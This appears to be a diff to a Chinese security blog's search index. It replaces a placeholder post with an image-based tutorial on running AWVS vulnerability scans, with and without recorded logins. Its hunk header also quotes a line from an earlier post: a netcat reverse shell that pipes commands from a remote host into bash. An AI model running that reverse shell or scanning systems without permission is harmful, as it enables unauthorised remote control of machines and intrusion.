@@ -151,15 +151,22 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </tags>
   </entry>
   <entry>
-    <title>我的第二篇文章</title>
-    <url>/2023/04/01/wo-de-di-er-pian-wen-zhang/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的第二篇文章"><a href="#我的第二篇文章" class="headerlink" title="我的第二篇文章"></a>我的第二篇文章</h1><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/12345.jpg" alt="经典图片"></p>
-]]></content>
+    <title>AWVS扫描使用教程</title>
+    <url>/2023/04/01/awvs-sao-miao-shi-yong-jiao-cheng/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="AWVS-Web-Scanner使用教程"><a href="#AWVS-Web-Scanner使用教程" class="headerlink" title="AWVS-Web Scanner使用教程"></a><strong>AWVS-Web Scanner使用教程</strong></h2><h3 id="一、不需要登录的扫描"><a href="#一、不需要登录的扫描" class="headerlink" title="一、不需要登录的扫描"></a>一、不需要登录的扫描</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686183724/a1_jrrysj.png"></p>
+<h3 id="第二步：等待结果即可"><a href="#第二步：等待结果即可" class="headerlink" title="第二步：等待结果即可"></a>第二步：等待结果即可</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686183923/a2_mgbzip.png"></p>
+<h2 id="二、需要登陆的扫描"><a href="#二、需要登陆的扫描" class="headerlink" title="二、需要登陆的扫描"></a>二、需要登陆的扫描</h2><h3 id="第一步：新建扫描"><a href="#第一步：新建扫描" class="headerlink" title="第一步：新建扫描"></a>第一步：新建扫描</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184353/a3_iywvmj.png"></p>
+<h3 id="第二步：输入目标IP地址，点击next"><a href="#第二步：输入目标IP地址，点击next" class="headerlink" title="第二步：输入目标IP地址，点击next"></a>第二步：输入目标IP地址，点击next</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184521/a4_zmp5vd.png"></p>
+<h3 id="第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next"><a href="#第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next" class="headerlink" title="第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next"></a>第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184639/a5_prqg8x.png"></p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686185306/a6_xpdvfk.png"></p>
+<h3 id="第四步：点击录制用户名密码"><a href="#第四步：点击录制用户名密码" class="headerlink" title="第四步：点击录制用户名密码"></a>第四步：点击录制用户名密码</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686185476/a7_msfpfr.png"></p>
+<h3 id="打开之后界面如下图所示，输入用户名密码，验证码"><a href="#打开之后界面如下图所示，输入用户名密码，验证码" class="headerlink" title="打开之后界面如下图所示，输入用户名密码，验证码"></a>打开之后界面如下图所示，输入用户名密码，验证码</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686185686/a8_sb9amh.png"></p>
+<h3 id="实战很重要，需要自己不断尝试。"><a href="#实战很重要，需要自己不断尝试。" class="headerlink" title="实战很重要，需要自己不断尝试。"></a>实战很重要，需要自己不断尝试。</h3>]]></content>
       <categories>
-        <category>渗透工具</category>
+        <category>黑客工具</category>
       </categories>
       <tags>
-        <tag>sqlmap工具</tag>
+        <tag>AWVS</tag>
       </tags>
   </entry>
   <entry>
